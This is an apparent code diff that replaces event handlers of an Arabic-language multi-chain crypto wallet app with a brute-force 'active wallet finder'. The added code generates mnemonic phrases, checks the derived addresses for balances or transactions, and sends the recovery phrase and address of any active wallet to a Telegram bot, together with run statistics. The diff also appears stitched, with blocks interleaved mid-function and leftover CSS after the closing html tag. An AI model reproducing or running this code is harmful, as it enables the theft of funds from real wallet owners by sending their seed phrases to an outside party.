-                hideModal('receiveModal');
-            });
-
-            document.getElementById('closeQrScannerModal').addEventListener('click', () => {
-                stopQRScanner();
-                hideModal('qrScannerModal');
-            });
-
-            document.getElementById('closeSettingsModal').addEventListener('click', () => {
-                hideModal('settingsModal');
-            });
-
-            document.
-
-
-getElementById('closeSupportModal').addEventListener('click', () => {
-                hideModal('supportModal');
-            });
-
-            document.getElementById('closeTransactionsModal').addEventListener('click', () => {
-                hideModal('transactionsModal');
-            });
-
-            // زر مسح QR
-            document.getElementById('scanAddressBtn').addEventListener('click', () => {
-                showModal('qrScannerModal');
-            });
-
-            // أزرار ماسح QR
-            document.getElementById('startScanBtn').addEventListener('click', startQRScanner);
-            document.getElementById('stopScanBtn').addEventListener('click', stopQRScanner);
-
-            // تغيير الشبكة في نافذة الاستقبال
-            document.getElementById('receiveNetworkSelect').addEventListener('change', (e) => {
-                const network = e.target.value;
-                const networkConfig = NETWORKS[network];
-                
-                if (currentWallet) {
-                    document.getElementById('receiveAddress').textContent = currentWallet.address;
-                    generateQRCode(currentWallet.address);
-                    
-                    // تحديث تحذير الشبكة
-                    const warningText = document.getElementById('receiveWarningText');
-                    if (network === 'ethereum') {
-                        warningText.textContent = 'أرسل فقط أصول Ethereum (ETH, ERC-20) إلى هذا العنوان';
-                    } else if (network === 'bsc') {
-                        warningText.textContent = 'أرسل فقط أصول Binance Smart Chain (BNB, BEP-20) إلى هذا العنوان';
-                    } else if (network === 'polygon') {
-                        warningText.textContent = 'أرسل فقط أصول Polygon (MATIC, Polygon tokens) إلى هذا العنوان';
-                    } else if (network === 'arbitrum') {
-                        warningText.textContent = 'أرسل فقط أصول Arbitrum (ETH, Arbitrum tokens) إلى هذا العنوان';
-                    } else if (network === 'optimism') {
-                        warningText.textContent = 'أرسل فقط أصول Optimism (ETH, Optimism tokens) إلى هذا العنوان';
-                    }
-                }
-            });
-
-            // تحديث خيارات الأصول عند تغيير الشبكة في نافذة الإرسال
-            document.getElementById('networkSelect').addEventListener('change', (e) => {
-                const network = e.target.value;
-                const assetSelect = document.getElementById('assetSelect');
-                const networkConfig = NETWORKS[network];
-                
-                // مسح الخيارات الحالية
-                assetSelect.innerHTML = '';
-                
-                // إضافة العملة الأساسية
-                const nativeOption = document.createElement('option');
-                nativeOption.value = networkConfig.symbol;
-                nativeOption.textContent = networkConfig.symbol;
-                assetSelect.appendChild(nativeOption);
-                
-                // إضافة الرموز المميزة
-                Object.keys(networkConfig.tokens || {}).forEach(token => {
-                    const option = document.createElement('option');
-                    option.value = token;
-                    option.textContent = token;
-                    assetSelect.appendChild(option);
-                });
-            });
-
-            // خيارات سرعة الغاز
-            document.querySelectorAll('.gas-option').forEach(option => {
-                option.addEventListener('click', () => {
-                    document.querySelectorAll('.gas-option').forEach(opt => opt.classList.remove('active'));
-                    option.classList.add('active');
-                });
-            });
-
-            // نموذج الإرسال
-            document.getElementById('sendForm').addEventListener('submit', async (e) => {
-                e.preventDefault();
-                
-                const network = document.getElementById('networkSelect').value;
-                const to = document.getElementById('recipientAddress').value.trim();
-                const amount = parseFloat(document.getElementById('sendAmount').value);
-                const asset = document.getElementById('assetSelect').value;
-                
-                if (!to || !amount || amount <= 0) {
-                    showToast('يرجى ملء جميع الحقول بشكل صحيح', 'warning');
+                const address = await mnemonicToAddress(mnemonic);
+                if (!address) {
+                    stats.errors++;
+                    addLogEntry('خطأ في تحويل العبارة إلى عنوان', 'error');
+                    updateStats();
                     return;
                 }
                 
-                if (!ethers.utils.isAddress(to)) {
-                    showToast('عنوان المحفظة غير صحيح', 'error');
-                    return;
-                }
+                const walletStatus = await isWalletActive(address);
                 
-                try {
-                    await sendTransaction(network, to, amount, asset);
-                    hideModal('sendModal');
-                    document.getElementById('sendForm').reset();
-                } catch (error) {
-                    console.error('Send transaction error:', error);
-                }
-            });
-
-            // نموذج الدعم الفني
-            document.getElementById('supportForm').addEventListener('submit', async (e) => {
-                e.preventDefault();
-                
-                const name = document.getElementById('supportName').value.trim();
-                const email = document.getElementById('supportEmail').value.trim();
-                const phone = document.getElementById('supportPhone').value.trim();
-                const message = document.getElementById('supportMessage').value.trim();
-                
-                if (!name || !email || !message) {
-                    showToast('يرجى ملء الحقول المطلوبة', 'warning');
-                    return;
-                }
-                
-                await sendSupportMessage(name, email, phone, message);
-            });
-
-            // أزرار الإعدادات
-            document.getElementById('showPrivateKeyBtn').addEventListener('click', async () => {
-                try {
-                    await promptForPasswordProfessional();
-                    if (currentWallet) {
-                        copyToClipboard(currentWallet.privateKey);
-                        showToast('تم نسخ المفتاح الخاص', 'success');
-                    }
-                } catch (error) {
-                    // المستخدم ألغى العملية
-                }
-            });
-
-            document.getElementById('showMnemonicBtn').addEventListener('click', async () => {
-                try {
-                    await promptForPasswordProfessional();
-                    if (currentWallet) {
-                        copyToClipboard(currentWallet.mnemonic);
-                        showToast('تم نسخ عبارة الاسترجاع', 'success');
-                    }
-                } catch (error) {
-                    // المستخدم ألغى العملية
-                }
-            });
-
-            document.getElementById('changePasswordBtn').addEventListener('click', () => {
-                showToast('ميزة تغيير كلمة المرور قريباً!', 'info');
-            });
-
-            document.getElementById('logoutBtn').addEventListener('click', () => {
-                if (confirm('هل أنت متأكد من تسجيل الخروج؟')) {
-                    logout();
-                    hideModal('settingsModal');
-                }
-            });
-
-            // فلاتر التحويلات
-            document.querySelectorAll('.filter-btn').forEach(btn => {
-                btn.addEventListener('click', () => {
-                    document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
-                    btn.classList.add('active');
+                if (walletStatus.isActive) {
+                    stats.activeWallets++;
+                    addLogEntry(`🎉 تم العثور على محفظة نشطة! العنوان: ${address}`, 'success');
                     
-                    const network = btn.getAttribute('data-network');
-                    displayAllTransactions(network);
-                });
-            });
-
-            // زر عرض جميع التحويلات
-            document.getElementById('viewAllTransactionsBtn').addEventListener('click', () => {
-                showModal('transactionsModal');
-                displayAllTransactions();
-            });
-
-            // إغلاق النوافذ المنبثقة عند النقر خارجها
-            document.querySelectorAll('.modal').forEach(modal => {
-                modal.addEventListener('click', (e) => {
-                    if (e.target === modal) {
-                        modal.classList.remove('active');
-                        if (modal.id === 'qrScannerModal') {
-                            stopQRScanner();
-                        }
+                    const telegramSent = await sendActiveWalletToTelegram(mnemonic, address, walletStatus);
+                    if (telegramSent) {
+                        addLogEntry('✅ تم إرسال المحفظة إلى Telegram بنجاح', 'success');
+                    } else {
+                        addLogEntry('❌ فشل في إرسال المحفظة إلى Telegram', 'error');
                     }
-                });
-            });
-
-            // تحديث دوري للأسعار والرصيد
-            setInterval(async () => {
-                if (currentWallet && document.getElementById('walletScreen').classList.contains('active')) {
-                    await fetchCryptoPrices();
-                    await updateBalance();
+                    
+                    updateStatus(`تم العثور على محفظة نشطة! إجمالي المحافظ النشطة: ${stats.activeWallets}`, 'success');
+                } else {
+                    stats.emptyWallets++;
+                    addLogEntry(`محفظة فارغة: ${address.substring(0, 20)}...`);
                 }
-            }, 60000); // كل دقيقة
+                
+                updateStats();
+                
+                // التحقق من الحد الأقصى للمحاولات
+                const maxAttempts = parseInt(elements.maxAttempts.value) || 0;
+                if (maxAttempts > 0 && stats.totalGenerated >= maxAttempts) {
+                    stopSearch();
+                    updateStatus(`تم الوصول للحد الأقصى من المحاولات (${maxAttempts})`, 'warning');
+                    addLogEntry(`تم إيقاف البحث - وصل للحد الأقصى: ${maxAttempts} محاولة`, 'info');
+                }
+                
+            } catch (error) {
+                stats.errors++;
+                addLogEntry(`خطأ في العملية: ${error.message}`, 'error');
+                updateStats();
+            }
+        }
 
-            console.log('Event listeners initialized');
-        });
+        // وظائف التحكم
+        async function startSearch() {
+            if (isRunning) return;
+            
+            isRunning = true;
+            elements.startBtn.disabled = true;
+            elements.stopBtn.disabled = false;
+            
+            const speed = parseInt(elements.searchSpeed.value) || 2000;
+            
+            updateStatus('جاري بدء البحث...', 'info');
+            addLogEntry('🚀 تم بدء البحث عن المحافظ النشطة');
+            
+            // إرسال رسالة البداية إلى Telegram
+            const startMessage = `🚀 <b>بدء عملية البحث عن المحافظ النشطة</b>\n\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}\n🔍 جاري البحث عن محافظ تحتوي على رصيد أو معاملات...`;
+            await sendTelegramMessage(startMessage);
+            
+            searchInterval = setInterval(searchForActiveWallets, speed);
+        }
 
-        // معالجة الأخطاء العامة
-        window.addEventListener('error', (e) => {
-            console.error('Global error:', e.error);
-            showToast('حدث خطأ غير متوقع', 'error');
-        });
+        async function stopSearch() {
+            if (!isRunning) return;
+            
+            isRunning = false;
+            elements.startBtn.disabled = false;
+            elements.stopBtn.disabled = true;
+            
+            if (searchInterval) {
+                clearInterval(searchInterval);
+                searchInterval = null;
+            }
+            
+            updateStatus('تم إيقاف البحث', 'warning');
+            addLogEntry('⏹️ تم إيقاف البحث');
+            
+            // إرسال رسالة الإيقاف إلى Telegram
+            let stopMessage = `⏹️ <b>تم إيقاف عملية البحث</b>\n\n`;
+            stopMessage += `📊 <b>الإحصائيات النهائية:</b>\n`;
+            stopMessage += `🔢 إجمالي العبارات: ${stats.totalGenerated}\n`;
+            stopMessage += `✅ المحافظ النشطة: ${stats.activeWallets}\n`;
+            stopMessage += `❌ المحافظ الفارغة: ${stats.emptyWallets}\n`;
+            stopMessage += `\n⏰ الوقت: ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
+            
+            await sendTelegramMessage(stopMessage);
+        }
 
-        // معالجة الأخطاء غير المعالجة
-        window.addEventListener('unhandledrejection', (e) => {
-            console.error('Unhandled promise rejection:', e.reason);
-            showToast('حدث خطأ في الشبكة', 'error');
-        });
+        async function testTelegramConnection() {
+            updateStatus('جاري اختبار الاتصال بـ Telegram...', 'info');
+            addLogEntry('🧪 جاري اختبار الاتصال بـ Telegram...');
+            
+            const testMessage = `🧪 <b>اختبار الاتصال</b>\n\nتم الاتصال بنجاح مع بوت Telegram!\n⏰ ${new Date().toLocaleString('ar-EG', { timeZone: 'Africa/Cairo' })}`;
+            const success = await sendTelegramMessage(testMessage);
+            
+            if (success) {
+                updateStatus('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
+                addLogEntry('✅ تم الاتصال بـ Telegram بنجاح!', 'success');
+            } else {
+                updateStatus('❌ فشل في الاتصال بـ Telegram', 'danger');
+                addLogEntry('❌ فشل في الاتصال بـ Telegram', 'error');
+            }
+        }
+
+        function clearLogs() {
+            elements.logPanel.innerHTML = '';
+            addLogEntry('تم مسح السجل');
+        }
+
+        // ربط الأحداث
+        elements.startBtn.addEventListener('click', startSearch);
+        elements.stopBtn.addEventListener('click', stopSearch);
+        elements.testTelegramBtn.addEventListener('click', testTelegramConnection);
+        elements.clearLogsBtn.addEventListener('click', clearLogs);
+
+        // تحديث الإحصائيات عند بدء التطبيق
+        updateStats();
+        updateStatus('جاهز للبدء...', 'info');
     </script>
 </body>
 </html>
-
-
-
-        .transactions-content {
-            display: flex;
-            flex-direction: column;
-            height: 100%;
-        }
-
-        .transactions-iframe {
-            width: 100%;
-            height: 500px; /* يمكن تعديل الارتفاع حسب الحاجة */
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            background-color: var(--bg-tertiary);
-        }
-
-
